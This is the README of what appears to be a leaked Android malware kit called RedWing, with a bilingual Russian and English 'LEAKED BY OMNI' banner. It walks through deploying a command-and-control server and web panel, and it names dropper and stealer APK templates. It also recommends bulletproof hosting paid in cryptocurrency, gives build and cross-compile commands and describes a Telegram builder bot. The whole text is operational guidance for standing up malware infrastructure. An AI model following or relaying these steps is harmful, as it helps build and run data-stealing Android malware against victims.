```
██████╗ ███████╗██████╗ ██╗    ██╗██╗███╗   ██╗ ██████╗
██╔══██╗██╔════╝██╔══██╗██║    ██║██║████╗  ██║██╔════╝
██████╔╝█████╗  ██║  ██║██║ █╗ ██║██║██╔██╗ ██║██║  ███╗
██╔══██╗██╔══╝  ██║  ██║██║███╗██║██║██║╚██╗██║██║   ██║
██║  ██║███████╗██████╔╝╚███╔███╔╝██║██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝
      LEAKED BY OMNI | t.me/omnibotnet | omni.lc
```

---

## Содержание / Contents

```
RedWing/
├── bin/
│   ├── linux/server          — бинарник Linux x86_64 / Linux x86_64 binary
│   └── windows/server.exe    — бинарник Windows x86_64 / Windows x86_64 binary
├── source/                   — полные исходники / full source code
│   ├── cmd/server/           — точка входа / entry point
│   ├── internal/             — серверная логика / server logic
│   ├── web/                  — панель управления (HTML) / control panel (HTML)
│   ├── decom/                — шаблоны APK + debug.keystore / APK templates + debug.keystore
│   ├── go.mod / go.sum       — зависимости Go / Go dependencies
│   └── ...
├── install-linux.sh          — установщик для Linux / Linux installer
├── install-windows.bat       — установщик для Windows / Windows installer
└── README.md                 — этот файл / this file
```

---

## 1. Быстрый старт / Quick Start

### Linux (Ubuntu / Debian / Mint)

```bash
chmod +x install-linux.sh
sudo ./install-linux.sh
```

Скрипт сделает всё сам / The script does everything automatically:

1. Установит Java 17, apktool 2.10.0, apksigner, zipalign / Installs Java 17, apktool 2.10.0, apksigner, zipalign
2. Развернёт сервер в `/opt/redwing` / Deploys server to `/opt/redwing`
3. Спросит IP, порт, режим регистрации и данные админа / Asks for IP, port, registration mode and admin credentials
4. Инициализирует БД и создаст админа / Initializes DB and creates admin
5. Запустит сервер через systemd / Starts server via systemd
6. Покажет URL панели / Shows panel URL

### Windows Server

Запустите `install-windows.bat` от имени Администратора.
*Run `install-windows.bat` as Administrator.*

Скрипт автоматически установит зависимости (Java, apktool, Android build-tools), развернёт сервер, спросит настройки и запустит панель.
The script automatically installs dependencies (Java, apktool, Android build-tools), deploys the server, asks for settings and starts the panel.

---

## 2. Покупка сервера / Getting a Server

Рекомендуемый хостинг с оплатой криптовалютой:
*Recommended hosting with cryptocurrency payment:*

| Провайдер / Provider | Сайт / Website                           | Оплата / Payment    |
| -------------------- | ---------------------------------------- | ------------------- |
| **HOSTKEY**          | [hostkey.com](https://hostkey.com)       | BTC, ETH, XMR, USDT |
| **BulletProof**      | [bulletproof.ad](https://bulletproof.ad) | BTC, ETH, XMR, USDT |

**Минимальные требования / Minimum Requirements:**

- 1 vCPU / 1 GB RAM / 10 GB SSD
- Ubuntu 22.04+ / Debian 12+ / Linux Mint 21+ или / or Windows Server 2019+
- Открытый порт / Open port `8080` (или другой / or custom)

---

## 3. Управление сервером / Server Management

### Linux

| Действие / Action             | Команда / Command               |
| ----------------------------- | ------------------------------- |
| Статус / Status               | `systemctl status redwing`      |
| Логи / Logs                   | `journalctl -u redwing -f`     |
| Перезапуск / Restart          | `systemctl restart redwing`    |
| Остановка / Stop              | `systemctl stop redwing`       |
| Включить автозапуск / Enable  | `systemctl enable redwing`     |
| Отключить автозапуск / Disable| `systemctl disable redwing`    |

Конфигурация сервиса: `/etc/systemd/system/redwing.service`
*Service config: `/etc/systemd/system/redwing.service`*

### Windows

| Действие / Action            | Команда / Command                                      |
| ---------------------------- | ------------------------------------------------------ |
| Запуск / Start               | `C:\RedWing\start.bat`                                 |
| Остановка / Stop             | `taskkill /f /im server.exe`                           |
| Автозапуск активен / Autostart | Task Scheduler → "RedWing"                           |

---

## 4. Переменные окружения / Environment Variables

| Переменная / Variable | Описание / Description                       | По умолчанию / Default |
| --------------------- | -------------------------------------------- | ---------------------- |
| `PORT`                | Порт сервера / Server port                   | `8080`                 |
| `SERVER_IP`           | Внешний IP (для APK) / External IP (for APK) | автоопределение / auto |
| `REGISTRATION`        | `open` / `closed`                            | `closed`               |
| `DB_PATH`             | Путь к БД SQLite / SQLite DB path            | `data/redwing.db`      |
| `BUILDER_BOT_TOKEN`   | Токен Telegram-бота / Telegram bot token     | —                      |

---

## 5. Ручная установка / Manual Installation

Если скрипт не подходит, ставьте вручную.
*If the script doesn't work, install manually.*

### Зависимости / Dependencies

- **Java 17+** — [adoptium.net](https://adoptium.net/)
- **apktool 2.10.0+** — [apktool.org](https://apktool.org/docs/install)
- **apksigner** — из Android SDK build-tools или `apt install apksigner` / from Android SDK build-tools or `apt install apksigner`
- **zipalign** — из Android SDK build-tools или `apt install zipalign` / from Android SDK build-tools or `apt install zipalign`

### Структура / Structure

Сервер ожидает такую структуру в рабочей директории:
*The server expects this structure in the working directory:*

```
/opt/redwing/           (или любая / or any)
├── server              (бинарник / binary)
├── data/               (SQLite БД, создаётся автоматически / auto-created)
├── decom/              (скопировать из source/decom / copy from source/decom)
│   ├── apk_smali/
│   ├── dropper_smali/
│   ├── stealer_smali/
│   └── debug.keystore  (ключ подписи APK / APK signing key — НЕ удалять / DO NOT delete)
└── web/                (скопировать из source/web / copy from source/web)
```

### Запуск / Launch

```bash
cd /opt/redwing
./server
```

---

## 6. Сборка из исходников / Building from Source

```bash
cd source/
go build -o server ./cmd/server/
```

Кросс-компиляция / Cross-compilation:

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o server ./cmd/server/
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o server.exe ./cmd/server/
```

Требуется **Go 1.21+** / Requires **Go 1.21+**

---

## 7. Telegram Builder Bot

Для работы Telegram-билдера укажите `BUILDER_BOT_TOKEN` в переменных окружения или введите токен в настройках панели.
*To use the Telegram builder, set `BUILDER_BOT_TOKEN` in environment variables or enter the token in panel settings.*

Создайте бота через [@BotFather](https://t.me/BotFather).
*Create a bot via [@BotFather](https://t.me/BotFather).*

---

```
LEAKED BY OMNI | t.me/omnibotnet | omni.lc
```
